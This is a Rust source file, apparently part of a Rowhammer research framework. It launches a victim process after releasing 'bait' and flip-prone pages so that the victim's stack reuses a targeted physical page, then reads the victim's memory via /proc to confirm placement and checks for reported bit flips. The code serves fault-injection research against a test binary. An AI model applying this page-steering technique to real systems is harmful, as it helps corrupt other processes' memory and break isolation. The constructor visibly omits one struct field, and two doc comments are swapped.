use std::{
    fs::OpenOptions,
    io::{BufRead, BufReader, Read, Seek, SeekFrom},
    process::{ChildStdin, ChildStdout},
    ptr::null_mut,
    thread,
    time::Duration,
};

use anyhow::bail;
use libc::sched_getcpu;
use pagemap::MapsEntry;

use crate::{
    allocator::util::{mmap, munmap},
    memory::PageMapInfo,
    util::{find_pattern, PipeIPC, IPC, PAGE_SIZE},
    victim::process::piped_channel,
};

use super::{HammerVictim, HammerVictimError};

pub struct StackProcess {
    child: std::process::Child,
    pipe: PipeIPC<ChildStdout, ChildStdin>,
    stderr_logger: Option<thread::JoinHandle<()>>,
    _flippy_page: Option<FlippyPage>,
}

/// The injection configuration.
pub struct InjectionConfig {
    /// The flippy page.
    pub flippy_page: *mut libc::c_void,
    /// The flippy page size.
    pub flippy_page_size: usize,
    /// The number of bait pages to release before the flippy page.
    pub bait_count_after: usize,
    /// The number of bait pages to release after the flippy page.
    pub bait_count_before: usize,
}

fn set_process_affinity(pid: libc::pid_t, core_id: usize) {
    use libc::{cpu_set_t, sched_setaffinity, CPU_SET, CPU_ZERO};

    unsafe {
        let mut cpuset: cpu_set_t = std::mem::zeroed();
        CPU_ZERO(&mut cpuset);
        CPU_SET(core_id, &mut cpuset);

        let result = sched_setaffinity(pid, std::mem::size_of::<cpu_set_t>(), &cpuset);
        if result != 0 {
            eprintln!(
                "Failed to set process affinity: {}",
                std::io::Error::last_os_error()
            );
        }
    }
}

fn get_current_core() -> usize {
    unsafe {
        let core_id = sched_getcpu();
        if core_id < 0 {
            panic!(
                "Failed to get current core: {}",
                std::io::Error::last_os_error()
            );
        } else {
            core_id as usize
        }
    }
}

impl StackProcess {
    /// Create a new `StackProcess` victim.
    ///
    /// # Arguments
    /// - `target`: The path to the target binary and args.
    /// - `injection_config`: The injection configuration.
    pub fn new(target: &[String], injection_config: InjectionConfig) -> anyhow::Result<Self> {
        let bait: *mut libc::c_void =
            if injection_config.bait_count_before + injection_config.bait_count_after != 0 {
                mmap(
                    null_mut(),
                    (injection_config.bait_count_before + injection_config.bait_count_after)
                        * PAGE_SIZE,
                )
            } else {
                null_mut()
            };
        set_process_affinity(unsafe { libc::getpid() }, get_current_core());
        let mut cmd = std::process::Command::new("taskset");
        cmd.arg("-c").arg(get_current_core().to_string());
        cmd.arg(target.first().expect("No target provided"));
        cmd.args(target[1..].to_vec());
        cmd.stdin(std::process::Stdio::piped());
        cmd.stdout(std::process::Stdio::piped());
        cmd.stderr(std::process::Stdio::piped());
        // dealloc
        info!("deallocating bait");

        unsafe {
            if injection_config.bait_count_before != 0 {
                munmap(bait, injection_config.bait_count_before * PAGE_SIZE);
            }
            munmap(
                injection_config.flippy_page,
                injection_config.flippy_page_size,
            );
            if injection_config.bait_count_after != 0 {
                munmap(
                    bait.byte_add(injection_config.bait_count_before * PAGE_SIZE),
                    injection_config.bait_count_after * PAGE_SIZE,
                );
            }
        }
        // spawn
        //info!("Launching victim");
        let mut child = cmd.spawn()?;
        info!("Victim launched");

        // Log victim stderr
        let stderr_logger = if let Some(stderr) = child.stderr.take() {
            let reader = BufReader::new(stderr);

            // Spawn a thread to handle logging from stderr
            let handle = thread::spawn(move || {
                for line in reader.lines() {
                    match line {
                        Ok(log_line) => {
                            info!("{}", log_line);
                        }
                        Err(err) => error!("Error reading line from child process: {}", err),
                    }
                }
            });
            Some(handle)
        } else {
            eprintln!("Failed to capture stderr");
            child.kill().expect("kill");
            child.wait().expect("wait");
            None
        };

        // todo: maybe check injection (prime+probe?)
        std::thread::sleep(Duration::from_millis(100));
        let num_cores = unsafe { libc::sysconf(libc::_SC_NPROCESSORS_ONLN) };
        let target_core = (get_current_core() + 1) % num_cores as usize;
        info!("Pinning child to core {}", target_core);
        set_process_affinity(child.id() as libc::pid_t, target_core);
        let pipe = piped_channel(&mut child)?;
        Ok(Self {
            child,
            pipe,
            stderr_logger,
        })
    }

    pub fn pid(&self) -> u32 {
        self.child.id()
    }
}

fn read_memory_from_proc(pid: u32, va: u64, size: u64) -> std::io::Result<Vec<u8>> {
    // Construct the path to the process's memory file
    let path = format!("/proc/{}/mem", pid);
    let mut file = OpenOptions::new().read(true).open(path)?;

    // Seek to the virtual memory address
    file.seek(SeekFrom::Start(va))?;

    // Read the specified number of bytes into a buffer
    let mut buffer = vec![0; size as usize];
    file.read_exact(&mut buffer)?;

    Ok(buffer)
}

#[derive(Debug)]
struct FlippyPage {
    #[allow(dead_code)]
    maps_entry: MapsEntry,
    #[allow(dead_code)]
    region_offset: usize, // page offset in the region
}

fn find_flippy_page(target_page: u64, pid: u32) -> anyhow::Result<Option<FlippyPage>> {
    let pmap = PageMapInfo::load(pid as u64)?.0;
    let mut flippy_region = None;
    for (map, pagemap) in pmap {
        for (idx, (va, pmap)) in pagemap.iter().enumerate() {
            let pfn = pmap.pfn();
            match pfn {
                Ok(pfn) => {
                    if target_page == pfn {
                        flippy_region = Some(FlippyPage {
                            maps_entry: map.0.clone(),
                            region_offset: idx,
                        });
                        info!("Region: {:?}", map.0);
                        debug!("Region size: {}", map.0.memory_region().size());
                        info!("[{}]  {:#x}    {:#x} [REUSED TARGET PAGE]", idx, va, pfn);
                        if let Some("[stack]") = map.0.path() {
                            let mut stack_contents = String::new();
                            let contents = read_memory_from_proc(pid, *va, PAGE_SIZE as u64);
                            match contents {
                                Ok(contents) => {
                                    match find_pattern(&contents, 0b10101010, PAGE_SIZE) {
                                        Some(offset) => {
                                            info!("Found pattern at offset {}", offset);
                                        }
                                        None => {
                                            info!("Pattern not found");
                                        }
                                    }
                                    for (i, byte) in contents.iter().enumerate() {
                                        stack_contents += &format!("{:02x}", byte);
                                        if i % 8 == 7 {
                                            stack_contents += " ";
                                        }
                                        if i % 64 == 63 {
                                            stack_contents += "\n";
                                        }
                                    }
                                    info!("Content:\n{}", stack_contents);
                                }
                                Err(e) => {
                                    info!("Failed to read stack contents: {}", e);
                                }
                            }
                        }
                    } else {
                        //info!("[{}]  {:#x}    {:#x}", idx, va, pfn);
                    }
                }
                Err(e) => match e {
                    pagemap::PageMapError::PageNotPresent => {
                        //info!("[{}]  {:#x}    ???", idx, va);
                    }
                    _ => bail!(e),
                },
            }
        }
    }
    Ok(flippy_region)
}

impl HammerVictim<String> for StackProcess {
    fn init(&mut self) {}

    fn check(&mut self) -> Result<String, HammerVictimError> {
        self.pipe
            .wait_for("press enter to start check".to_string())?;
        self.pipe.send(b'\n')?;
        let resp: String = self.pipe.receive().map_err(HammerVictimError::IoError)?;
        if resp.starts_with("FLIPPED") {
            Ok(resp)
        } else {
            Err(HammerVictimError::NoFlips)
        }
    }

    fn stop(mut self) {
        self.child.kill().expect("kill");
        self.child.wait().expect("wait");
        if let Some(stderr_logger) = self.stderr_logger {
            stderr_logger.join().expect("join");
        }
    }
}

#[cfg(test)]
mod tests {
    use std::ptr::null_mut;

    use crate::{allocator::util::mmap, util::PAGE_SIZE, victim::HammerVictim};

    #[test]
    fn test_stack_process() -> anyhow::Result<()> {
        let target = vec!["../victim-stack/stack".to_string()];
        let ptr = mmap(null_mut(), PAGE_SIZE);
        let injection_config = super::InjectionConfig {
            flippy_page: ptr,
            flippy_page_size: PAGE_SIZE,
            bait_count_after: 0,
            bait_count_before: 0,
        };
        let mut stack_process = super::StackProcess::new(&target, injection_config)?;
        for _ in 0..10 {
            stack_process.init();
            let resp = stack_process.check();
            assert!(matches!(resp, Err(super::HammerVictimError::NoFlips)));
        }
        Ok(())
    }
}
